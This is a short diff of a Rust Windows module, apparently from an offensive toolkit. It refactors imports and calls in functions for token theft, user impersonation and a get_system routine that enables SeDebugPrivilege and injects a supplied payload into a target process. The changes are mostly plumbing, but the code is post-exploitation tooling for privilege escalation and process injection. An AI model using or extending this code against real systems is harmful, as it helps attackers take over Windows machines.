@@ -14,9 +14,9 @@ use windows::Win32::System::Threading::{CreateProcessAsUserW, CreateProcessWithL
                                         PROCESS_CREATE_THREAD, PROCESS_CREATION_FLAGS, PROCESS_DUP_HANDLE, PROCESS_INFORMATION, 
                                         PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, 
                                         STARTUPINFOW, STARTUPINFOW_FLAGS};
-use crate::common::process::get_processes;
 use crate::win::common::{get_buffer, to_wide_string};
-use crate::win::process::remote_inject;
+
+use super::inject::remote_inject;
 
 pub fn get_token(pid: u32, access_rights: TOKEN_ACCESS_MASK) -> Result<HANDLE> {
     unsafe {
@@ -118,7 +118,7 @@ pub fn impersonate_user(username: &str) -> Result<HANDLE> {
     }
 
     // 获取进程信息
-    let processes = match get_processes() {
+    let processes = match crate::common::process::get_processes() {
         Ok(procs) => procs,
         Err(_) => {
             return Err(Error::from(
@@ -433,14 +433,14 @@ pub fn run_as(
 }
 
 pub fn get_system(data: &[u8], pid: u32) -> Result<()> {
-    let processes = get_processes().map_err(|e| {
+    let processes = crate::common::process::get_processes().map_err(|_| {
         Error::from_win32()
     })?;
     
     for (_pid, process) in processes.iter() {
         if process.pid == pid {
             enable_privilege("SeDebugPrivilege")?;
-            remote_inject(process.pid, data)?;
+            let _ = remote_inject(data, process.pid);
             break;
         }
     }
